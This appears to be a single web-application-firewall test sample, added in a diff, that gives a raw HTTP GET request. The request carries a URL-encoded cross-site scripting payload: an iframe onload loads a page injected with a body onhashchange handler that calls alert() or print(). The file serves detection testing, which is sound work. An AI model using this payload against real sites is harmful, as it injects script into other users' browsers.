@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_body标签_onhashchange事件-06506576
+# 攻击载荷利用了HTML中的body标签和onhashchange属性，触发alert()函数，显示一个警告框。如果哈希值改变则触发
+GET /?id=%3Ciframe%20onload=%22if%28%21window.flag%29%7Bthis.contentWindow.location=%27https:%2F%2Ftest.com%2Fxss%2Fxss.php%3Fx=%3Cbody%20onhashchange=print%28%29%3E%23%27%3Bflag=1%7D%22%20src=%22https:%2F%2Ftest.com%2Fxss%2Fxss.php%3Fx=%3Cbody%20onhashchange=alert%28%29%3E%22%3E%3C%2Fiframe%3E&bid=hd_tag_m8mv268d HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv268d
+RM-PRO-Token: bfb08664d1282efbdcc55036d013b7dd
+RM-PRO-Time: 1742808554454
+User-Agent: curl/7.83.1
+
